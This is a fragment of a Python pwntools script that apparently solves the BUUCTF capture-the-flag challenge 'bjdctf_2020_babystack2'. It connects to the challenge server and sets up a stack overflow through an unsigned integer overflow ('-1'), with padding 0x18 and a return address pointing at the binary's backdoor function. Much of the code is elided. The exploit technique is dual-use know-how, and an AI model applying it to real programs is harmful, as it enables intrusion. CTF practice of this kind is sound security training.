'''
@Author       : 白银
@Date         : 2023-04-12 14:15:39
@LastEditors  : 白银
@LastEditTime : 2023-04-12 15:13:18
@FilePath     : /pwn/bjdctf_2020_babystack2.py
@Description  : https://buuoj.cn/challenges#bjdctf_2020_babystack2
@Attention    : 
...
pwnfile = './bjdctf_2020_babystack2'  # pwnfile， str，二进制文件
...
if if_remote == 1:
    ...
    io = remote("node4.buuoj.cn", 29337)
...
padding = 0x18  # ida看上限到r的距离
return_addr = 0x400726  # ida找到backoddr函数地址

payload1 = flat(['-1']) # 无符号数整数溢出
